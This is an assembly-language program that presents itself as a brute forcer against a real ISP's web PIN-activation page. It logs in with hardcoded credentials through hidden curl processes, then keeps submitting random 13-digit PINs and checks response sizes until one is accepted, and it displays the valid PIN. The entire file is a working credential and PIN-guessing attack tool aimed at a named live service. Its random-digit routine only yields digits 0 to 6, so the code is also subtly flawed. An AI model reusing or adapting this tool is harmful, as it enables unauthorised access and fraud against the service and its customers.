.586
.model flat, stdcall
option casemap :none
  
include \masm32\include\windows.inc

include \masm32\include\user32.inc
include \masm32\include\kernel32.inc

includelib \masm32\lib\user32.lib
includelib \masm32\lib\kernel32.lib

.data?
buffer db 256 dup(?)
onnet db 16 dup(?)

ProcessInfo PROCESS_INFORMATION <>
Startup STARTUPINFO <>

hFile dd ?

.data
string db "Bor0's bruteforcer -- Valid pin code", 0

param1 db "curl.exe https://secure.on.net.mk/users/nlogin.php -d ", 34,
          "userlogin=damagerulz", 34, " -d ", 34, "userpassword=target",
          34, " -d ", 34, "signup=1", 34, " -d ", 34, "image.x=19", 34,
          " -d ", 34, "image.y=6", 34, " -c ", 34, "boro.cook", 34, 0

param2 db "curl.exe https://secure.on.net.mk/users/npin.php -d ", 34,
          "pin=%s", 34, " -d ", 34, "activate=activate", 34, " -d ",
          34, "image.x=19", 34, " -d ", 34, "image.y=6", 34, " -b ",
          34, "boro.cook", 34, " -o ", 34, "boro.html", 34, 0

myfile db "boro.html", 0
curl db "curl.exe", 0

.code
start:

push ebp
xor ebp, ebp
mov ebp, 13
@@: dec ebp
rdtsc ;generate 13 random digits
xor edx, edx
mov ecx, 7
div ecx
add edx, 48
mov byte ptr [onnet+ebp], dl
test ebp, ebp
jne @B
pop ebp

mov word ptr [onnet], 3030h ;first 2 are zeroes
invoke wsprintf, ADDR buffer, ADDR param2, ADDR onnet

here:
invoke CreateProcess, ADDR curl, ADDR param1, 0, 0, 0, CREATE_NO_WINDOW,
0, 0, ADDR Startup, ADDR ProcessInfo
invoke WaitForSingleObject, [ProcessInfo.hProcess], INFINITE

invoke CreateProcess, ADDR curl, ADDR buffer, 0, 0, 0, CREATE_NO_WINDOW,
0, 0, ADDR Startup, ADDR ProcessInfo
invoke WaitForSingleObject, [ProcessInfo.hProcess], INFINITE

invoke CreateFile, ADDR myfile, GENERIC_READ, FILE_SHARE_READ, 0,
OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
mov dword ptr [hFile], eax
invoke GetFileSize, eax, 0

push eax
invoke CloseHandle, [hFile]
pop eax

cmp eax, 8358 ;incorrect pin
je start
cmp eax, 8377 ;pin already used
je start
cmp eax, -1   ;connection failure
je here

invoke MessageBox, 0, ADDR onnet, ADDR string, 0 ;lucky bastard
invoke ExitProcess, 0

end start
